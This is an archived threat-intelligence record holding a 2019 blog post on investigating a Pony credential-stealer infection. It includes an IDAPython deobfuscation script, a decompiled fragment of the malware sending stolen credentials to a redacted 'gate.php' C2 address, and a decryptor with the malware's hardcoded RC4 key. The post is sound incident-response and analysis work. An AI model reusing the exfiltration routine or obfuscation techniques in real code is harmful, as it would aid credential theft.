@@ -1,0 +1,82 @@
+{
+    "id": "664f73c3-6de5-427c-9836-1919cdacb33d",
+    "created_at": "2023-01-12T15:06:31.642442Z",
+    "updated_at": "2025-03-27T02:16:26.42179Z",
+    "deleted_at": null,
+    "sha1_hash": "e75cba5c950f2cf39d5128ee0f29f997efb6bb18",
+    "title": "2019-07-30 - Practical Threat Hunting and Incidence Response - A Case of A Pony Malware Infection",
+    "authors": "",
+    "file_creation_date": "2022-05-27T21:30:42Z",
+    "file_modification_date": "2022-05-27T21:30:42Z",
+    "file_size": 667672,
+    "plain_text": "# Practical Threat Hunting and Incidence Response : A Case of A Pony Malware Infection\n\n**[int0xcc.svbtle.com/practical-threat-hunting-and-incidence-response-a-case-of-a-pony-malware-infection](https://int0xcc.svbtle.com/practical-threat-hunting-and-incidence-response-a-case-of-a-pony-malware-infection)**\n\nJuly 30, 2019\nMost organizations opt for an incidence response, after a catastrophic cyber security event\nhas taken place . Incidence response and threat hunting focus on events that happen after\nan endpoint is hit by a cyber attacks,for example a malware infection . One of the main\ngoals of a holistic approach for threat hunting and incidence response is to determine the\nextent of damages done by the attack and recover as much possible from it .\n\nIn this blog post, I will present a scenario of threat hunting and Incidence response out of a\nmalware infection on an endpoint .\n\nFirst step in threat hunting is to look for infection markers, and a basic way to figure out a\nmalware infection is to look for any suspicious running processes\n\nQuickly we are able to locate a suspicious running process named as\n\n_Pckntl.exe . This is what most people do next, upload the file to virus total, but often times it_\ndoes no justice .\n\n\n-----\n\nBy all means, this malware seems to be packed and obfuscated, perhaps why none of the\nanti virus/endpoint systems were able to detect this file with full confidence .\n\nAnd, this is where we will have to get our hands dirty and do the nasty work . We have to do\nsome manual work on this file . As soon as we dig bit deeper, we immediate figure out this is\na VB 6 packed file . Decompiling the file revels lots of name mangling and obfuscation used.\n\n\n-----\n\nCode behind the VB 6 packer is irrelevant to our analysis, unless you have got lot of free\ntime in your hands . Instead of banging our heads around this useless code, we will let it run\nand break in between to get a look at the real hidden code behind this packer\n\nAfter running it for a while, we attach debugger and the hidden code is finally revealed\n\n\n-----\n\nThere are lot of strings and functions calls in this code, which probably means that this is the\nfinal layer of unpacked malware and consequently we dump the code to file system\n\nThe obvious next task would be to correctly identify this malicious code . Earlier, we had no\nluck with VirusTotal, so this time instead of using virus total, we will use this amazing\nmalware identification platform known as Malpedia created by Daniel Plohmann. This\nsystem is great for maching with Yara rules written by community, and it does have a\nplethora of Yara mules to match against .\n\nAnd Wow!, Malpedia didn’t disappoint us . Impressive system .\n\nImmediately, this great system was able to figure out which malware this belongs to .\nMalpedia was able to identify this samples as Pony trojan .\n\nNow what does this pony malware do ?\n\n\n-----\n\nA pony malware is a credential harvesting malware . we will have to resurrect the forensic\ninvestigator in all of us :P . As its happens to be a credential harvester and the endpoint was\ninfected, most certainly so credentials were exfiltrated from network . This is where\nincidence response comes into play . We will investigate about the exfiltrated credentials and\npossibly recover them .\n\nAs we notice the captured PCAP file, it is quite obvious that the exfiltrated data is in\nsomeways encrypted\n\nBut before we start feeling lucky, we have got another hurdle in front of us . The malware\nhas control flow obfuscation in its code . This makes analysis terribly difficult and defeats\nIDA’s static analysis engine\n\n\n-----\n\nIt uses stack to align control flow, with some instructions in-between which have no side\neffects on EIP. In order to recover from this mess and allow IDA to recognize subroutines\nwith proper stack alignment, we will write an IDAPython script to deobfuscate this bad boy\n```\nAntiDisam = 0\nDebug = 0\ndef WriteMem(addr, buff):\n  global Debug\n  if Debug:\n    DbgWrite(addr, buff)\n  else:\n    for i in buff:\n      PatchByte(addr, ord(i))\n      addr = addr + 1\n  return\nwhile 1:\n  blackList = [0x00410621,0x004105C3 ]\n  AntiDisam = FindBinary(AntiDisam + 1, SEARCH_DOWN, \"55 8B EC 5D 68 ?? ?? ?? ?? F8\n72 01\")\n  print hex(AntiDisam)\n  if AntiDisam == 0xffffffff:\n    break\n  if AntiDisam in blackList:\n    WriteMem(AntiDisam + 3, \"\\x90\" * 11)\n    continue\n  WriteMem(AntiDisam, \"\\x90\" * 14)\n\n```\n\n-----\n\n** Before and after executing script **\n\nWe start analysing from the place it sends exfiltrated data to c2\n```\n if ( pstm && GeneratePacket(pstm, &Data) == 1 )\n {\n  for ( i = “http://XXXX/gate.php”; *i && !v0; ++i )\n  {\n   v3 = 2;\n   while ( 1 )\n   {\n    v4 = 0;\n    if ( SendPacket(i, pstm, (int)&v4) )\n    {\n     if ( v4 )\n     {\n      v0 = sub_40FB14(v4);\n      if ( !v0 )\n      {\n       if ( sub_401BC0(v4) )\n        v0 = sub_40FB14(v4);\n      }\n     }\n     }\n\n```\n\n-----\n\nAn abridged version of our analysis would be the following\n\nData is recovered from saved password of many applications ( FTP, EMail, Browser,\nbitcoin )\nHeader and metadata information is appended to packet ( PWD FILE 01 version and\nmagic with length fields )\nThis packet is compressed using APLIB\nAnother packet header is appended with header CRYPTED0 magic, subsequently this\npacket is encrypted using RC4 with a hardcoded key\nFurthermore, this packet is again encrypted using RC4, but this time with a randomly\ngenerated key, appended to the packet at first 4 bytes\n\nIt would be relatively easy to convert this narrative into a python code and decrypt the\nexfiltrated data from PCAP file\n```\nimport struct \nimport aplib\nimport sys \ndef main():\n  ciphertext = open(sys.argv[1], \"rb\").read()\n  key =ciphertext[0:4]\n  ciphertext = ciphertext[4:].encode(\"hex\")\n  decrypted = decrypt(key, ciphertext)\n  key = \"K!K\"\n  ciphertext = decrypted[8:].encode(\"hex\")\n  decrypted = decrypt(key, ciphertext)\n  open(\"FinalOutput\", \"wb\").write(aplib.decompress(decrypted[0x0c + 4:]))\nmain()\n\n```\n```\nPython Decrypt.py Ouput.bin\n\n```\n\n-----\n\nAnd finally we get to see the exfiltrated credentials in plain text . Attackers managed to steal\nsome Email credentials and FTP logins\n\n24\n\nKudos\n\n24\n\nKudos\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-07-30 - Practical Threat Hunting and Incidence Response - A Case of A Pony Malware Infection.pdf"
+    ],
+    "report_names": [
+        "2019-07-30 - Practical Threat Hunting and Incidence Response - A Case of A Pony Malware Infection.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "81dde5cc-c29f-430d-8c6e-e5e92d5015e7",
+            "created_at": "2022-10-25T16:07:23.704358Z",
+            "updated_at": "2025-03-27T02:02:09.932453Z",
+            "deleted_at": null,
+            "main_name": "Harvester",
+            "aliases": [],
+            "source_name": "ETDA:Harvester",
+            "tools": [
+                "Agentemis",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "Graphon",
+                "Metasploit",
+                "cobeacon"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
+            "created_at": "2024-11-01T02:00:52.756877Z",
+            "updated_at": "2025-03-27T02:00:55.544216Z",
+            "deleted_at": null,
+            "main_name": "Play",
+            "aliases": null,
+            "source_name": "MITRE:Play",
+            "tools": [
+                "Nltest",
+                "AdFind",
+                "PsExec",
+                "Wevtutil",
+                "Cobalt Strike",
+                "Playcrypt",
+                "Mimikatz"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535991,
+    "ts_updated_at": 1743041786,
+    "ts_creation_date": 1653687042,
+    "ts_modification_date": 1653687042,
+    "files": {
+        "pdf": "https://archive.orkl.eu/e75cba5c950f2cf39d5128ee0f29f997efb6bb18.pdf",
+        "text": "https://archive.orkl.eu/e75cba5c950f2cf39d5128ee0f29f997efb6bb18.txt",
+        "img": "https://archive.orkl.eu/e75cba5c950f2cf39d5128ee0f29f997efb6bb18.jpg"
+    }
+}
